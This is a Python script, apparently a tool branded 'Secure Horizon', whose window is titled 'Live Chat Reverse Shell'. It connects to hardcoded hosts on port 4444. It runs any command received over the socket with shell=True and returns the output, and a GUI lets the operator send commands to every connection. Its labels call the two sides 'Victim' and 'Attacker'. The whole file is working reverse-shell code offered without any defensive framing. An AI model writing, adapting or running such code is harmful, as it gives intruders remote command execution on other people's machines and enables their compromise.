import subprocess
import sys
import socket
import threading
import time
import tkinter as tk
from tkinter import scrolledtext

# Check if tkinter is installed, if not, install it
try:
    import tkinter
except ImportError:
    print("Tkinter not found, installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "tk"])
    import tkinter

# Set IPs and port
Socket_IPs = ["192.168.1.128", "192.168.1.30"]
Socket_PORT = 4444
MAX_RETRIES = 5  # Maximum retries for connection attempts

# ASCII banner
ascii_banner = """
  SSSSS  EEEEE  CCCCC  U   U  RRRR    EEEEE     H   H  OOOOO  RRRR    III  ZZZZZ  OOOOO  N   N
 S       E      C      U   U  R   R   E         H   H  O   O  R   R    I     Z    O   O  NN  N
  SSSSS  EEEE   C      U   U  RRRR    EEEE      HHHHH  O   O  RRRR     I     ZZZ  O   O  N N N
     S   E      C      U   U  R  R    E         H   H  O   O  R  R    I        Z  O   O  N  NN
  SSSSS  EEEEE  CCCCC   UUU   R   R   EEEEE     H   H  OOOOO  R   R   III  ZZZZZ  OOOOO  N   N
"""

# Function to handle connection attempts
def connect_to(ip):
    attempts = 0
    while attempts < MAX_RETRIES:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, Socket_PORT))
            print(f"[*] Connected to {ip}:{Socket_PORT}")
            return s
        except Exception as e:
            attempts += 1
            print(f"[!] Connection failed for {ip}:{Socket_PORT} - {e}, retrying... ({attempts}/{MAX_RETRIES})")
            time.sleep(5)  # Retry after 5 seconds
    print(f"[!] Failed to connect to {ip}:{Socket_PORT} after {MAX_RETRIES} attempts.")
    return None

# List to hold active connections
sockets = []
for ip in Socket_IPs:
    socket_conn = connect_to(ip)
    if socket_conn:
        sockets.append(socket_conn)

# If no connection was established, exit
if not sockets:
    print("[X] No connections established. Exiting.")
    exit()

# GUI setup
root = tkinter.Tk()
root.title("Live Chat Reverse Shell")
root.geometry("800x600")
root.config(bg='#2e2e2e')

banner_frame = tkinter.Frame(root, bg='#2e2e2e')
banner_frame.pack(pady=10)

banner_label = tkinter.Label(banner_frame, text=ascii_banner, font=("Courier", 10), fg='red', bg='#2e2e2e', anchor='w', justify=tkinter.LEFT)
banner_label.pack(padx=10)

chat_frame = tkinter.Frame(root, bg='#2e2e2e')
chat_frame.pack(pady=10)

output_area = scrolledtext.ScrolledText(chat_frame, width=90, height=20, wrap=tkinter.WORD, bg='#1e1e1e', fg='#f8f8f2', font=("Courier", 10))
output_area.pack(padx=10)
output_area.config(state=tkinter.DISABLED)

command_entry = tkinter.Entry(root, width=70, font=("Courier", 12))
command_entry.pack(pady=10)

send_button = tkinter.Button(root, text="Send Command", command=lambda: send_command(), font=("Courier", 12), bg='#4CAF50', fg='white', relief='raised', width=20)
send_button.pack(pady=10)

# Send command to victims
def send_command():
    command = command_entry.get()
    if command.lower() == "exit":
        for s in sockets:
            s.send(command.encode('utf-8'))
        root.quit()
    else:
        for s in sockets:
            s.send(command.encode('utf-8'))
        update_output(f"Victim: {command}", "blue")
        command_entry.delete(0, tkinter.END)

# Update the output area with received data
def update_output(output, color):
    output_area.config(state=tkinter.NORMAL)
    output_area.insert(tkinter.END, output + "\n")
    output_area.tag_add("end", "1.0", "end")
    output_area.tag_configure("end", foreground=color)
    output_area.yview(tkinter.END)
    output_area.config(state=tkinter.DISABLED)

# Function to receive and process commands from victims
def start_receiving(sock):
    while True:
        try:
            command = sock.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break

            if command.lower() == "whoami":
                output = subprocess.run("whoami", shell=True, capture_output=True)
                sock.send(output.stdout + output.stderr)
                update_output(f"Attacker: {output.stdout.decode().strip()}", "green")

            elif command.lower() == "systeminfo":
                output = subprocess.run("systeminfo", shell=True, capture_output=True)
                sock.send(output.stdout + output.stderr)
                update_output(f"Attacker: {output.stdout.decode().strip()}", "green")

            elif command.lower() == "ipconfig":
                output = subprocess.run("ipconfig", shell=True, capture_output=True)
                sock.send(output.stdout + output.stderr)
                update_output(f"Attacker: {output.stdout.decode().strip()}", "green")

            else:
                output = subprocess.run(command, shell=True, capture_output=True)
                sock.send(output.stdout + output.stderr)
                update_output(f"Attacker: {output.stdout.decode().strip()}", "green")

        except Exception as e:
            update_output(f"Error: {e}", "red")
            break

    sock.close()

# Start receiving thread for each connected socket
for s in sockets:
    receiving_thread = threading.Thread(target=start_receiving, args=(s,))
    receiving_thread.daemon = True
    receiving_thread.start()

root.mainloop()
